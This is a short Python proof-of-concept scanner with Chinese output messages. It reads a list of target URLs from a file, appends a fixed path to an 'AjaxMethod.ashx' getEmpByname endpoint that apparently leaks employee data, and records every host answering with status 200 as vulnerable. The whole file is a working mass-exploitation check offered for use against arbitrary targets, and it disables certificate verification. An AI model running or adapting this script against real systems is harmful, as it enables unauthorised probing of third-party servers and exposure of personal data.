
import json
import requests


urls = open('url.txt')

poc = '/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y'

for i in urls:
    url = i.rstrip("\n")
    vulnurl = url + poc
    try:
        response = requests.get(vulnurl, timeout=3, verify=False)
        if response.status_code == 200:

            print("\n\033[1;32m[+]存在漏洞\tpayload:\033[0m",vulnurl)
            with open('漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("\n\033[1;31m[-]不存在漏洞\033[0m",vulnurl)

    except:
        print('\n\033[1;31m[-]响应超时..............\033[0m')
        pass